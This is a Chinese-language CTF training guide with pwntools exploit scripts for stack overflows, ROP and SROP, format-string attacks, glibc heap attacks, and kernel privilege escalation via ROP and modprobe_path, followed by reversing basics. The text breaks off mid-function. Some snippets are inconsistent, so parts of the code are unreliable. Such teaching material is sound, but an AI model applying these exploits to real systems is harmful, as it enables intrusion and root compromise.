# CTF PWN与逆向方向详解

> 本文档详细讲解CTF竞赛中PWN（二进制漏洞利用）和逆向工程方向的各类题型，包括栈溢出、ROP、格式化字符串、堆利用、内核PWN、静态逆向、动态调试、脱壳、混淆对抗等，每类题型附带代码示例和实战案例。

---

## 目录

- [一、PWN基础](#一pwn基础)
- [二、栈溢出题型](#二栈溢出题型)
- [三、ROP利用](#三rop利用)
- [四、格式化字符串漏洞](#四格式化字符串漏洞)
- [五、堆利用](#五堆利用)
- [六、内核PWN基础](#六内核pwn基础)
- [七、逆向分析题型](#七逆向分析题型)
- [八、混淆对抗](#八混淆对抗)
- [九、实战案例](#九实战案例)

---

## 一、PWN基础

### 1.1 ELF文件结构

ELF（Executable and Linkable Format）是Linux下的可执行文件格式，理解其结构是PWN的基础。

```c
/* ELF文件结构概览
 * ELF Header
 *   ├─ Magic: 7f 45 4c 46 (\x7fELF)
 *   ├─ Class: 32-bit(1) / 64-bit(2)
 *   ├─ Data: Little Endian(1) / Big Endian(2)
 *   ├─ Type: ET_EXEC(2) / ET_DYN(3)
 *   └─ Entry point: 程序入口地址
 *
 * Program Headers (程序头表 - 运行时视图)
 *   ├─ PT_LOAD: 可加载段
 *   ├─ PT_INTERP: 解释器路径
 *   ├─ PT_GNU_STACK: 栈属性（NX判断依据）
 *   └─ PT_GNU_RELRO: RELRO保护
 *
 * Section Headers (节头表 - 链接时视图)
 *   ├─ .text: 代码段
 *   ├─ .data: 已初始化数据
 *   ├─ .bss: 未初始化数据
 *   ├─ .rodata: 只读数据
 *   ├─ .got: 全局偏移表
 *   ├─ .got.plt: PLT GOT表
 *   ├─ .plt: 过程链接表
 *   └─ .rel.plt: 重定位信息
 */
```

### 1.2 保护机制检查

```bash
# 使用 checksec 检查保护机制
# 安装: pip install checksec.py 或 pwntools自带
checksec ./binary

# 输出示例:
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
```

```python
from pwn import *

# 使用pwntools检查保护机制
elf = ELF('./binary')
print(f"Arch: {elf.arch}")
print(f"RELRO: {elf.relro}")
print(f"Canary: {elf.canary}")
print(f"NX: {elf.nx}")
print(f"PIE: {elf.pie}")

# 保护机制详解
protections = {
    "NX (No-eXecute)": "栈/堆不可执行，阻止shellcode注入",
    "ASLR": "地址空间随机化，每次运行加载地址不同",
    "PIE": "可执行文件地址随机化，代码段也随机",
    "Canary": "栈金丝雀，检测栈溢出（__stack_chk_fail）",
    "RELRO": "重定位只读，分为Partial和Full两种",
    "Full RELRO": "GOT表只读，无法修改GOT表",
    "Partial RELRO": "GOT表可写，可以改GOT表",
    "FORTIFY": "缓冲区溢出检查（编译时启用）",
}
```

### 1.3 pwntools使用详解

```python
from pwn import *

# ========== 基本配置 ==========
context.log_level = 'debug'    # 调试输出
context.arch = 'amd64'        # 架构: i386/amd64/arm/mips
context.os = 'linux'          # 操作系统
context.terminal = ['tmux', 'splitw', '-h']  # GDB调试终端

# ========== 连接方式 ==========
# 本地进程
p = process('./pwn_binary')

# 远程连接
p = remote('ctf.challenge.com', 9999)

# 带参数启动
p = process(['./pwn_binary', 'arg1', 'arg2'])

# GDB调试模式
p = gdb.debug('./pwn_binary', '''
    b main
    b *0x401234
    continue
''')

# ========== 数据交互 ==========
# 发送数据
p.send(b'data')           # 发送原始数据
p.sendline(b'data')       # 发送数据+换行
p.sendafter(b'> ', b'data')    # 等到收到'> '后发送
p.sendlineafter(b'> ', b'data') # 等到收到'> '后发送+换行

# 接收数据
data = p.recv(1024)        # 接收指定字节
line = p.recvline()        # 接收一行
until = p.recvuntil(b': ')  # 接收直到指定字符串
all_data = p.recvall()     # 接收所有数据
repeat = p.recvn(10)       # 精确接收10字节

# ========== 地址/数据打包 ==========
p64(0x401234)    # 打包64位地址（小端序）
p32(0x08049000)  # 打包32位地址
u64(b'\x34\x12\x00\x00\x00\x00\x00\x00')  # 解包64位
u32(b'\x34\x12\x00\x00')                   # 解包32位

# ========== ELF操作 ==========
elf = ELF('./binary')
# 获取函数地址
system_addr = elf.symbols['system']    # system函数地址
main_addr = elf.symbols['main']       # main函数地址
# 获取字符串地址
binsh_addr = next(elf.search(b'/bin/sh\x00'))  # 搜索/bin/sh字符串
# 获取GOT表
puts_got = elf.got['puts']    # puts的GOT表地址
# 获取PLT表
puts_plt = elf.plt['puts']    # puts的PLT表地址

# ========== 获取shell
p.interactive()  # 进入交互模式，可以手动输入命令
```

---

## 二、栈溢出题型

### 2.1 ret2text

当程序中存在后门函数（如`backdoor()`或`system("/bin/sh")`）时，直接覆盖返回地址跳转到后门。

```python
from pwn import *

context(arch='amd64', os='linux')

# 题目分析：
# 程序中有后门函数 backdoor() at 0x4011b6
# 存在栈溢出漏洞
# 没有开启NX或后门函数不需要NX

p = remote('ctf.example.com', 9999)

# 分析确定溢出偏移
# 缓冲区大小为0x40，saved rbp占8字节
offset = 0x40 + 8  # = 72

# 后门函数地址
backdoor = 0x4011b6

# 构造payload: padding + 返回地址
payload = b'A' * offset + p64(backdoor)

# 注意：64位函数地址需要对齐到16字节边界
# 如果报错可以加一个ret gadget用于对齐
ret_gadget = 0x40101a  # ret指令地址
payload = b'A' * offset + p64(ret_gadget) + p64(backdoor)

p.sendline(payload)
p.interactive()
```

### 2.2 ret2shellcode

当NX未开启时，可以将shellcode写入栈上并跳转执行。

```python
from pwn import *

context(arch='amd64', os='linux')

p = process('./ret2shellcode')

# 生成shellcode
shellcode = asm(shellcraft.sh())
print(f"[*] Shellcode长度: {len(shellcode)}")

# 题目分析：
# 1. 程序将输入读取到栈上的buf
# 2. 没有开启NX保护
# 3. 返回地址可以指向buf

# 需要知道buf的栈地址
# 可以通过题目输出或泄露获得
buf_addr = 0x7fffffff1234  # 假设通过泄露得到

offset = 0x40 + 8

# 将shellcode放在padding前面
payload = shellcode + b'\x90' * (offset - len(shellcode)) + p64(buf_addr)

p.sendline(payload)
p.interactive()
```

### 2.3 ret2libc

当NX开启且ASLR存在时，需要泄露libc基址，然后使用libc中的`system`和`/bin/sh`。

```python
from pwn import *

context(arch='amd64', os='linux')

elf = ELF('./ret2libc')
p = remote('ctf.example.com', 9999)

# 题目分析：
# 1. NX开启，不能执行栈上shellcode
# 2. ASLR开启，libc地址随机
# 3. 存在puts函数，可以用来泄露libc地址

# 步骤1：泄露puts函数的真实地址
# 利用puts打印puts的GOT表内容
pop_rdi_ret = 0x401233  # ROPgadget --binary ret2libc | grep "pop rdi"
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

offset = 0x40 + 8

# 第一段ROP: 泄露puts真实地址后返回main
payload1 = b'A' * offset
payload1 += p64(pop_rdi_ret)    # pop rdi; ret
payload1 += p64(puts_got)       # puts的GOT地址 → 传入rdi
payload1 += p64(puts_plt)       # 调用puts打印GOT内容
payload1 += p64(main_addr)      # 返回main进行二次利用

p.sendline(payload1)

# 接收泄露的puts地址
p.recvuntil(b'output:\n')
leaked_puts = u64(p.recv(6).ljust(8, b'\x00'))
print(f"[+] 泄露的puts地址: {hex(leaked_puts)}")

# 步骤2：计算libc基址
# 需要知道远程libc中puts的偏移
# 可以使用LibcSearcher或手动查询
from LibcSearcher import LibcSearcher

libc = LibcSearcher('puts', leaked_puts)
libc_base = leaked_puts - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')

print(f"[+] libc基址: {hex(libc_base)}")
print(f"[+] system地址: {hex(system_addr)}")
print(f"[+] /bin/sh地址: {hex(binsh_addr)}")

# 步骤3：第二次溢出，调用system("/bin/sh")
ret_gadget = pop_rdi_ret + 1  # ret指令，用于栈对齐

payload2 = b'A' * offset
payload2 += p64(ret_gadget)     # 栈对齐
payload2 += p64(pop_rdi_ret)
payload2 += p64(binsh_addr)
payload2 += p64(system_addr)

p.sendline(payload2)
p.interactive()
```

### 2.4 ret2csu

当找不到足够的gadget时，可以利用`__libc_csu_init`函数中的通用gadget。

```python
from pwn import *

context(arch='amd64', os='linux')

# __libc_csu_init 中的两个关键gadget:
# Gadget1 (csu_init尾部):
#   pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
csu_gadget1 = 0x40123a  # 假设地址

# Gadget2 (csu_init中段):
#   mov rdx, r14; mov rsi, r13; mov edi, r12d
#   call [r15 + rbx*8]; add rbx, 1
#   ...
#   jne loop; ...; ret
csu_gadget2 = 0x401220  # 假设地址

# 利用csu gadget调用函数
# 可以控制: rdi(edi), rsi, rdx 三个参数
# 以及通过[r15+rbx*8]调用任意函数

offset = 0x40 + 8

# 设置参数并调用函数
payload = b'A' * offset
# Gadget1: 设置rbx=0, rbp=1, r12=arg1, r13=arg2, r14=arg3, r15=函数地址
payload += p64(csu_gadget1)
payload += p64(0)           # rbx = 0
payload += p64(1)           # rbp = 1
payload += p64(arg1)        # r12 → edi (第一个参数)
payload += p64(arg2)        # r13 → rsi (第二个参数)
payload += p64(arg3)        # r14 → rdx (第三个参数)
payload += p64(func_addr)   # r15 → [r15+rbx*8] 调用的函数地址
# Gadget2: 执行调用
payload += p64(csu_gadget2)
# Gadget2执行后会继续pop6次+ret
payload += p64(0) * 7       # 填充6个pop + 1个ret后的地址
payload += p64(next_addr)   # 最终返回地址

# ret2csu常用于:
# 1. 调用write(1, got_addr, 8) 泄露libc
# 2. 调用read(0, bss_addr, size) 写入数据
# 3. 调用其他需要3个参数的函数
```

### 2.5 栈迁移（Stack Pivot）

当溢出空间有限时，可以将栈迁移到可控区域。

```python
from pwn import *

context(arch='amd64', os='linux')

# 栈迁移原理:
# 利用 "leave; ret" 指令
# leave = mov rsp, rbp; pop rbp
# 通过控制rbp来控制rsp

# 题目场景:
# 1. 输入空间很小（只能覆盖rbp和ret地址）
# 2. 有足够大的可控区域（如BSS段）

leave_ret = 0x40101a  # leave; ret gadget地址
bss_addr = 0x404060   # BSS段可控区域地址

# 步骤1: 在BSS段写入ROP链
# 通过其他漏洞（如格式化字符串）或程序功能写入

# 步骤2: 覆盖saved rbp为 bss_addr-8
# 覆盖返回地址为 leave_ret
payload = b'A' * 0x20  # 填充缓冲区
payload += p64(bss_addr - 8)  # 覆盖saved rbp
payload += p64(leave_ret)     # 覆盖返回地址

# 当执行 leave; ret 时:
# 1. mov rsp, rbp → rsp = bss_addr - 8
# 2. pop rbp → rbp = [bss_addr - 8], rsp = bss_addr
# 3. ret → 跳转到 [bss_addr] 处的指令
# 此时栈已经迁移到BSS段，执行我们写入的ROP链
```

---

## 三、ROP利用

### 3.1 ROPgadget使用

```bash
# 查找所有gadget
ROPgadget --binary ./pwn

# 查找特定gadget
ROPgadget --binary ./pwn | grep "pop rdi"

# 查找pop rdi; ret（设置第一个参数）
ROPgadget --binary ./pwn | grep "pop rdi ; ret"

# 查找ret（用于栈对齐）
ROPgadget --binary ./pwn | grep ": ret$"

# 查找syscall
ROPgadget --binary ./pwn | grep "syscall"

# 查找int 0x80（32位系统调用）
ROPgadget --binary ./pwn | grep "int 0x80"
```

```python
from pwn import *

# 使用pwntools的ROP模块
elf = ELF('./binary')
rop = ROP(elf)

# 自动查找gadget
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# 自动构造ROP链
rop.raw(ret)                    # 栈对齐
rop.call(elf.symbols['puts'], [elf.got['puts']])  # 泄露puts地址
rop.call(elf.symbols['main'])   # 返回main

# 获取构造好的ROP链
payload = rop.chain()
print(payload)
```

### 3.2 多段ROP链

```python
from pwn import *

context(arch='amd64', os='linux')

# 多段ROP: 泄露libc → 返回main → 第二次溢出getshell

p = remote('ctf.example.com', 9999)
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

# === 第一段ROP: 泄露libc基址 ===
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

rop.raw(ret)                           # 栈对齐
rop.raw(pop_rdi)
rop.raw(elf.got['puts'])               # 参数: puts的GOT地址
rop.raw(elf.plt['puts'])               # 调用puts
rop.raw(elf.symbols['main'])           # 返回main

offset = 0x40 + 8
payload1 = b'A' * offset + rop.chain()

p.sendline(payload1)

# 接收泄露的地址
leaked = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = leaked - libc.symbols['puts']
print(f"[+] libc基址: {hex(libc_base)}")

# === 第二段ROP: 调用system("/bin/sh") ===
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))

rop2 = ROP(elf)
rop2.raw(ret)          # 栈对齐
rop2.raw(pop_rdi)
rop2.raw(binsh_addr)
rop2.raw(system_addr)

payload2 = b'A' * offset + rop2.chain()

p.sendline(payload2)
p.interactive()
```

### 3.3 SROP（Sigreturn Oriented Programming）

```python
from pwn import *

context(arch='amd64', os='linux')

# SROP原理:
# 利用sigreturn系统调用恢复信号上下文
# 可以一次性设置所有寄存器

# 需要的条件:
# 1. 能触发sigreturn（syscall 15）
# 2. 能控制栈上的Sigreturn Frame

# 构造Sigreturn Frame
frame = SigreturnFrame()
frame.rax = 59          # execve系统调用号
frame.rdi = binsh_addr  # 参数1: /bin/sh地址
frame.rsi = 0           # 参数2: NULL
frame.rdx = 0           # 参数3: NULL
frame.rsp = stack_addr   # 栈指针
frame.rip = syscall_addr # 指向syscall; ret

# 利用链:
# 1. 设置rax=15（sigreturn系统调用号）
# 2. 调用syscall
# 3. 栈上的frame被恢复到寄存器
# 4. 按照frame中的值继续执行

# 完整示例
# 假设有一个read函数可以读取大量数据到栈上
read_addr = 0x401234   # read函数地址
syscall_addr = 0x401250 # syscall; ret地址
binsh_addr = 0x404050   # /bin/sh字符串地址

# 通过read的返回值设置rax
# read(0, buf, size) → 如果读入15字节，rax=15
# 15恰好是sigreturn的系统调用号!

# 构造Frame
frame = SigreturnFrame()
frame.rax = 59           # execve
frame.rdi = binsh_addr   # /bin/sh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr

# Payload:
# 1. 填充 + read地址（读入15字节）
# 2. 返回到 syscall_addr
# 3. SigreturnFrame

payload = b'A' * offset
payload += p64(read_addr)    # 调用read
payload += p64(syscall_addr) # 然后执行syscall
payload += bytes(frame)       # Frame数据

# 发送15字节数据触发sigreturn
# read会返回读取的字节数=15，rax=15
# 然后syscall执行sigreturn
p.sendline(payload)
p.send(b'A' * 15)  # 精确15字节
p.interactive()
```

---

## 四、格式化字符串漏洞

### 4.1 漏洞原理

```c
/* 格式化字符串漏洞示例
 * 
 * 漏洞代码:
 * printf(user_input);  // 用户输入直接作为格式化字符串
 * 
 * 正确代码:
 * printf("%s", user_input);
 */

/* 
 * 常见格式化说明符:
 * %d - 输出十进制整数
 * %x - 输出十六进制
 * %s - 输出字符串（从栈上取地址）
 * %p - 输出指针地址
 * %n - 将已输出的字节数写入指定地址（核心利用）
 * %hn - 写入2字节
 * %hhn - 写入1字节
 * %c - 输出字符
 *
 * %N$p - 输出第N个参数
 * %N$x - 第N个参数的十六进制
 * %Nc - 输出N个字符（用于控制%n写入的值）
 */
```

### 4.2 任意地址读

```python
from pwn import *

context(arch='amd64', os='linux')

p = remote('ctf.example.com', 9999)

# 1. 确定格式化字符串的偏移
# 输入 AAAA%p.%p.%p.%p.%p.%p.%p.%p
# 找到 0x41414141 出现的位置
for i in range(1, 20):
    payload = f'AAAA%{i}$p'
    p.sendline(payload.encode())
    result = p.recvline()
    if '41414141' in result.hex() or '0x41414141' in result.decode(errors='ignore'):
        print(f"[+] 偏移: {i}")
        offset = i
        break

# 2. 读取指定地址的数据
# 利用 %s 读取地址处的内容
# 需要将目标地址放在格式化字符串中
target_addr = 0x601018  # 要读取的地址

# 构造payload: 地址 + %offset$s
# 注意64位地址可能包含\x00导致截断
# 解决方法: 将地址放在后面
payload = f'%{offset + 1}$s'.encode()
payload = payload.ljust(8, b'\x00')  # 对齐到8字节
payload += p64(target_addr)

p.sendline(payload)
leaked = p.recv()
print(f"[+] 泄露数据: {leaked}")
```

### 4.3 任意地址写

```python
from pwn import *

context(arch='amd64', os='linux')

p = remote('ctf.example.com', 9999)

# 利用 %n 写入数据
# %n: 将已输出的字符数写入地址
# %hn: 写入2字节
# %hhn: 写入1字节

# 目标: 将 0x401234 写入地址 0x601050
target = 0x601050
value = 0x401234

# 方法: 分字节写入
# 将目标地址拆分为4个字节地址
# 分别写入对应值

# 构造写入payload
def fmt_write(offset, target, value):
    """构造格式化字符串写入payload"""
    
    # 将value拆分为4个2字节
    val_parts = [(value >> (i * 16)) & 0xffff for i in range(2)]
    addr_parts = [target + i * 2 for i in range(2)]
    
    payload = b''
    # 写入地址（放在payload开头，64位需要处理\x00）
    for addr in addr_parts:
        payload += p64(addr)
    
    # 对每个2字节值构造 %c 和 %hn
    written = len(payload)  # 已输出的字节数
    for i, val in enumerate(val_parts):
        if val > written:
            payload += f'%{val - written}c'.encode()
            written = val
        payload += f'%{offset + i}$hn'.encode()
    
    return payload

# 实际CTF中通常使用工具
# 可以使用 pwntools 的 fmtstr_payload
payload = fmtstr_payload(offset, {target: value}, write_size='byte')
p.sendline(payload)
```

### 4.4 泄露canary

```python
from pwn import *

context(arch='amd64', os='linux')

# Canary在栈上的位置:
# [局部变量]
# [canary]       ← 需要泄露
# [saved rbp]
# [return addr]

# 利用格式化字符串泄露canary
p = remote('ctf.example.com', 9999)

# 假设格式化字符串偏移为6
# canary在栈上的偏移为11（需要分析确定）
# 可以通过 %11$p 泄露canary

p.sendline(b'%11$p')
result = p.recvline()
canary = int(result.strip(), 16)
print(f"[+] Canary: {hex(canary)}")

# 使用泄露的canary进行栈溢出
# 注意: canary最低字节为\x00，需要正确填充
offset = 0x40  # 缓冲区到canary的距离
payload = b'A' * offset
payload += p64(canary)    # 正确的canary
payload += b'B' * 8       # saved rbp
payload += p64(backdoor)  # 返回地址

p.sendline(payload)
p.interactive()
```

---

## 五、堆利用

### 5.1 fastbin dup（Double Free）

```python
from pwn import *

context(arch='amd64', os='linux')

# fastbin double free 原理:
# 1. free(chunkA) → fastbin: A
# 2. free(chunkB) → fastbin: B → A
# 3. free(chunkA) → fastbin: A → B → A (环!)
# 4. malloc() → 返回A, 写入fd指向target
# 5. malloc() → 返回B
# 6. malloc() → 返回A (再次), 此时fd已被修改
# 7. malloc() → 返回target地址!

# 利用步骤:
p = remote('ctf.example.com', 9999)

def add(size, data):
    p.sendlineafter(b'choice:', b'1')
    p.sendlineafter(b'size:', str(size).encode())
    p.sendlineafter(b'data:', data)

def free(idx):
    p.sendlineafter(b'choice:', b'2')
    p.sendlineafter(b'index:', str(idx).encode())

def show(idx):
    p.sendlineafter(b'choice:', b'3')
    p.sendlineafter(b'index:', str(idx).encode())

# 1. 分配3个fastbin chunk
add(0x30, b'AAAA')  # idx 0
add(0x30, b'BBBB')  # idx 1
add(0x30, b'CCCC')  # idx 2

# 2. Double Free
free(0)  # fastbin: 0
free(1)  # fastbin: 1 -> 0
free(0)  # fastbin: 0 -> 1 -> 0 (环!)

# 3. 分配并写入fd
# 目标地址: __malloc_hook (libc中)
malloc_hook_offset = 0x7f123456  # 需要泄露计算
add(0x30, p64(malloc_hook_addr))  # 0的fd被修改
add(0x30, b'BBBB')  # 从fastbin取出1
add(0x30, b'CCCC')  # 从fastbin取出0

# 4. 下一次分配返回目标地址
add(0x30, p64(one_gadget_addr))  # 写入one_gadget到__malloc_hook

# 5. 触发malloc调用__malloc_hook
add(0x30, b'trigger')  # 触发one_gadget → getshell

p.interactive()
```

### 5.2 unsorted bin attack

```python
from pwn import *

# unsorted bin attack 原理:
# 当chunk被放入unsorted bin时，其fd和bk指向main_arena
# 利用一个被修改的bk可以实现"任意地址写一个libc地址"
# 写入的值 = main_arena + 88 (64位) 或 main_arena + 48 (32位)

# 利用步骤:
# 1. 分配一个大于fastbin范围的chunk
# 2. 利用其他漏洞修改被释放chunk的bk
# 3. 再次malloc触发unsorted bin链表操作
# 4. 目标地址被写入main_arena地址

# 适用场景:
# - 需要将某个变量覆写为很大的值
# - 覆写global_max_fast为很大的值（使fastbin能容纳更大的chunk）

p = remote('ctf.example.com', 9999)

# 分配大chunk
add(0x100, b'A' * 0x100)  # idx 0
add(0x100, b'B' * 0x100)  # idx 1 - 防止合并

# 修改释放后的chunk的bk
# 需要有UAF或堆溢出漏洞
target_addr = 0x602060  # 要写入的地址

# 利用漏洞修改chunk0的bk
# bk = target_addr - 0x10 (64位)
# 因为unsorted bin链操作: chunk->bk->fd = unsorted_bin_head
# 即 *(target_addr - 0x10 + 0x10) = main_arena_addr
# = *(target_addr) = main_arena_addr
edit(0, p64(0) + p64(target_addr - 0x10))  # 修改fd和bk

# 重新分配触发unsorted bin attack
add(0x100, b'trigger')

# 此时 target_addr 被写入了main_arena地址（一个很大的值）
print("[+] unsorted bin attack完成")
```

### 5.3 tcache利用（glibc 2.26+）

```python
from pwn import *

context(arch='amd64', os='linux')

# tcache (Thread Local Caching) 是glibc 2.26引入的每线程缓存
# tcache特点:
# 1. 每个线程独立维护tcache
# 2. tcache bin是单链表（通过next/fd链接）
# 3. tcache对安全检查较弱（早期版本无double free检查）
# 4. tcache优先于fastbin

# tcache double free利用
p = remote('ctf.example.com', 9999)

def add(data):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'data:', data)

def free_(idx):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'idx:', str(idx).encode())

def show(idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'idx:', str(idx).encode())

# 1. 泄露heap地址
add(b'AAAA')  # idx 0
add(b'BBBB')  # idx 1
free_(0)
free_(1)
show(1)  # 泄露heap地址（tcache的fd指向下一个free chunk）

# 2. 泄露libc地址
add(b'/bin/sh\x00')  # idx 0 (填入/bin/sh)
add(0x100, b'large')  # idx 1 大chunk
free_(1)  # 进入unsorted bin
show(1)  # 泄露main_arena地址 → 计算libc基址

# 3. tcache double free
free_(0)
free_(0)  # tcache double free (glibc < 2.29)

# 4. 修改tcache fd
add(p64(target_addr))  # idx 0, fd被写入target_addr
add(b'placeholder')     # idx 1
add(p64(one_gadget))   # idx 2, 从target_addr分配

p.interactive()
```

### 5.4 house of系列

```python
# house of spirit
# 原理: 在目标地址构造一个fake chunk header
# 然后free该地址，将其放入fastbin
# 下次malloc会返回该地址

# 步骤:
# 1. 在栈/BSS上构造fake chunk:
#    [prev_size] [size | flags]  ← size需要是fastbin范围(0x20-0x80)
#    [data...]                    ← fake chunk内容
#    [prev_size] [size]           ← next chunk header
# 2. free(&fake_chunk)
# 3. malloc() → 返回 &fake_chunk

# house of force
# 厃理: 利用top chunk的size被覆盖为很大的值
# 可以通过malloc一个超大值使top chunk指针前移
# 实现任意地址分配

# 步骤:
# 1. 溢出覆盖top chunk的size为0xffffffffffffffff
# 2. malloc(target_addr - current_top - header_size)
# 3. top chunk移动到target_addr
# 4. 再malloc()返回target_addr

# house of einherjar
# 原理: 利用off-by-one null byte覆盖prev_in_use位
# 使free时误认为前一个chunk已释放，触发chunk合并
# 合并到可控区域

# house of orange (无free的利用)
# 原理: 不调用free，利用top chunk耗尽触发sysmalloc
# 获取unsorted bin chunk，再利用文件流漏洞(_IO_FILE)
```

---

## 六、内核PWN基础

### 6.1 kernel ROP

```python
from pwn import *

context(arch='amd64', os='linux')

# 内核PWN环境通常提供:
# 1. 一个有漏洞的内核模块（.ko文件）
# 2. 一个bzImage（内核镜像）
# 3. 一个文件系统镜像（cpio/gz）

# 分析内核模块
# 1. 提取模块: 从cpio中提取.ko文件
# 2. 使用IDA分析: 寻找漏洞（通常在ioctl/read/write中）
# 3. 确定保护: 检查内核编译选项

# 内核保护机制:
# - KASLR: 内核地址随机化
# - SMEP: 管理模式执行保护（不能在用户态执行内核代码）
# - SMAP: 管理模式访问保护（不能在用户态访问内核数据）
# - KPTI: 内核页表隔离

# kernel ROP利用步骤:

# 1. 保存用户态寄存器（用于返回用户态）
# 在用户态准备
user_cs = 0
user_ss = 0
user_rflags = 0
user_sp = 0
user_ip = 0

def save_state():
    """保存用户态状态"""
    global user_cs, user_ss, user_rflags, user_sp, user_ip
    # 通过汇编保存
    # ...省略实现

# 2. 提权
# commit_creds(prepare_kernel_cred(0))
# 需要知道这两个函数的地址

prepare_kernel_cred = 0xffffffff810XXXXX  # 泄露或固定地址
commit_creds = 0xffffffff810YYYYY

# 3. 构造ROP链
rop_chain = b''
rop_chain += p64(pop_rdi_ret)
rop_chain += p64(0)                    # 参数: NULL
rop_chain += p64(prepare_kernel_cred) # 调用prepare_kernel_cred(0)
rop_chain += p64(mov_rdi_rax_jmp)     # 将返回值(rax)移到rdi
rop_chain += p64(commit_creds)        # 调用commit_creds(rax)

# 4. 返回用户态
rop_chain += p64(swapgs_pop_rbp)      # swapgs
rop_chain += p64(0)
rop_chain += p64(iretq)               # iretq
rop_chain += p64(user_ip)             # 返回到用户态函数
rop_chain += p64(user_cs)
rop_chain += p64(user_rflags)
rop_chain += p64(user_sp)
rop_chain += p64(user_ss)

# 5. 触发漏洞并执行ROP
# 通过内核模块漏洞覆盖返回地址
```

### 6.2 ret2usr

```python
# ret2usr: 在内核态执行用户态代码
# 前提: SMEP和SMAP未开启

# 利用步骤:
# 1. 在用户态编写提权代码
# 2. 利用内核漏洞将执行流劫持到用户态函数

# 用户态提权函数
"""
void escalate_privs() {
    // 直接在用户态调用内核函数
    // 因为没有SMEP/SMAP，内核可以执行用户态代码
    commit_creds(prepare_kernel_cred(0));
    // 返回用户态
    swapgs();
    iretq(
        user_ip,    // 返回地址
        user_cs,
        user_rflags,
        user_sp,
        user_ss
    );
}
"""

# 如果SMEP开启，需要通过ROP关闭CR4中的SMEP位
# mov cr4, 0x6f0 (关闭SMEP)
# 然后再跳转到用户态代码
```

### 6.3 modprobe_path利用

```python
from pwn import *

# modprobe_path 利用原理:
# 当内核尝试执行未知格式的二进制文件时
# 会调用 modprobe_path 指定的程序来加载
# 默认值为 /sbin/modprobe
# 如果能将其修改为自定义脚本，就能以root权限执行命令

# 利用步骤:
# 1. 通过内核漏洞获得任意写原语
# 2. 读取modprobe_path地址
#    /proc/kallsyms 或 通过偏移计算
# 3. 覆写modprobe_path为 /tmp/x
# 4. 在/tmp/x写入恶意脚本（如复制flag）
# 5. 执行一个未知格式的二进制文件触发modprobe
# 6. modprobe_path指向的脚本以root权限执行

# 示例:
# 1. 写入脚本
"""
#!/bin/sh
cat /flag > /tmp/flagged
chmod 777 /tmp/flagged
"""
# 保存到 /tmp/x 并 chmod +x

# 2. 触发modprobe
"""
# 创建一个未知格式的文件
echo -ne '\xff\xff\xff\xff' > /tmp/dummy
chmod +x /tmp/dummy
/tmp/dummy  # 触发内核调用modprobe_path
"""

# 3. 读取flag
# cat /tmp/flagged
```

---

## 七、逆向分析题型

### 7.1 静态逆向

```python
# 静态逆向使用IDA Pro / Ghidra

# 逆向分析步骤:
# 1. 查看main函数
# 2. 理解程序流程
# 3. 找到关键比较函数
# 4. 分析加密算法
# 5. 编写逆向脚本

# IDA常用快捷键:
# F5 - 反编译为C伪代码
# N - 重命名变量/函数
# Y - 修改变量类型
# G - 跳转到地址
# X - 查看交叉引用
# ; - 添加注释

# 典型逆向题目示例:
"""
# IDA伪代码
int __cdecl main(int argc, const char **argv, const char **envp) {
    char input[32];
    char encrypted[32];
    
    scanf("%32s", input);
    encrypt(input, encrypted);
    
    if (strcmp(encrypted, "ENCRYPTED_FLAG") == 0)
        printf("Correct!\n");
    else
        printf("Wrong!\n");
    
    return 0;
}

void encrypt(char *input, char *output) {
    for (int i = 0; i < 32; i++) {
        output[i] = input[i] ^ 0x42;  // 简单异或
        output[i] = (output[i] << 3) | (output[i] >> 5);  // 循环左移3
    }
}
"""

# 逆向解密脚本:
def decrypt(encrypted):
    result = b''
    for c in encrypted:
        # 逆向循环左移3 = 循环右移3
        c = (c >> 3) | (c << 5)
        c = c & 0xFF
        # 逆向异或
        c = c ^ 0x42
        result += bytes([c])
    return result

encrypted_flag = b'\x...'  # 从程序中提取
flag = decrypt(encrypted_flag)
print(flag.decode())
```

### 7.2 动态调试

```python
# 使用GDB + pwndbg进行动态调试

# GDB常用命令:
gdb_commands = """
# 断点
b main          # 在main函数下断
b *0x401234     # 在地址处下断
b encrypt      # 在encrypt函数下断
delete         # 删除所有断点
info b          # 查看断点列表

# 执行
run             # 运行程序
continue/c      # 继续执行
step/s          # 单步进入函数
next/n          # 单步不进入函数
finish          # 执行到函数返回

# 查看
x/s 0x404060    # 查看字符串
x/20xw 0x7fff   # 查看内存（20个word）
info registers  # 查看寄存器
print/x $rax    # 查看寄存器值

# 修改
set $rax = 0x1234   # 修改寄存器
set {char}0x404060 = 0x41  # 修改内存

# 跟踪
strace ./binary  # 系统调用跟踪
ltrace ./binary  # 库函数跟踪
"""

# Python脚本配合GDB自动化调试
from pwn import *

p = gdb.debug('./reverse', '''
    b *0x401234
    b encrypt
    continue
''')

# 在断点处读取内存
p.sendline(b'test_input')
# 等待断点触发后交互
p.interactive()
```

### 7.3 算法还原

```python
# 复杂算法逆向 - 需要将汇编还原为Python

# 示例: 分析一个复杂的校验算法
"""
分析步骤:
1. 在IDA中找到校验函数
2. 理解每个操作的含义
3. 还原为Python代码
4. 编写解密/爆破脚本
"""

# 逆向还原示例 - 变种Base64
def reverse_custom_b64(encrypted):
    """还原自定义Base64解码"""
    # 从IDA分析得知的变表
    custom_table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    # 原始表
    std_table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    
    # 如果是变表，替换回标准表
    trans = str.maketrans(custom_table, std_table)
    standard = encrypted.translate(trans)
    
